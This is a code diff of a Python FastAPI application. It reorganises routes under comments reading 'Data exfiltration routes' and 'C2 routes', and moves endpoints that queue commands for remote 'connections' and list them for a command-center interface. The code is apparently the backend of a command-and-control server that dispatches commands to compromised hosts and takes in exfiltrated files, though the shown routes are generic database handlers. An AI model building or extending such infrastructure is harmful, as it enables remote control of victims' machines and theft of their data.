@@ -24,6 +24,8 @@ class FileResponse(BaseModel):
 async def index(request: Request):
     return templates.TemplateResponse('index.html', {'request': request})
 
+# Data exfiltration routes
+
 # render the upload form in an HTML template
 @app.post('/upload')
 async def upload_file(file: UploadFile = File(...)):
@@ -85,6 +87,34 @@ async def download_file(filename: str):
 
     # Return the file data as a response
     return StreamingResponse(grid_file, media_type='application/octet-stream')
+
+# C2 routes
+
+# add a new command to the database
+@app.post('/command/{connection_id}')
+async def add_command(connection_id: str, command: str):
+    # retrieve the connection from the database
+    connection = connections.find_one({"_id": connection_id})
+    if not connection:
+        raise HTTPException(status_code=404, detail="Connection not found")
+
+    # add the command to the database
+    connections.update_one({"_id": connection_id}, {"$push": {"commands": command}})
+
+    return {"message": "Command added to queue"}
+
+# get a list of all commands for one connection from the database to be displayed in the web interface
+@app.get('/command-list/{connection_id}')
+async def get_command_list(connection_id: str):
+    # retrieve the connection from the database
+    connection = connections.find_one({"_id": connection_id})
+    if not connection:
+        raise HTTPException(status_code=404, detail="Connection not found")
+
+    # retrieve the commands from the database
+    commands = connection["commands"]
+
+    return {"commands": commands}
 
 # render a list of all connections in an HTML template
 @app.get('/command-center')
@@ -183,30 +213,6 @@ async def get_output(connection_id: str):
 
     return {"output": output}
 
-# add a new command to the database
-@app.post('/command/{connection_id}')
-async def add_command(connection_id: str, command: str):
-    # retrieve the connection from the database
-    connection = connections.find_one({"_id": connection_id})
-    if not connection:
-        raise HTTPException(status_code=404, detail="Connection not found")
 
-    # add the command to the database
-    connections.update_one({"_id": connection_id}, {"$push": {"commands": command}})
-
-    return {"message": "Command added to queue"}
-
-# get a list of all commands for one connection from the database to be displayed in the web interface
-@app.get('/command-list/{connection_id}')
-async def get_command_list(connection_id: str):
-    # retrieve the connection from the database
-    connection = connections.find_one({"_id": connection_id})
-    if not connection:
-        raise HTTPException(status_code=404, detail="Connection not found")
-
-    # retrieve the commands from the database
-    commands = connection["commands"]
-
-    return {"commands": commands}
 
 
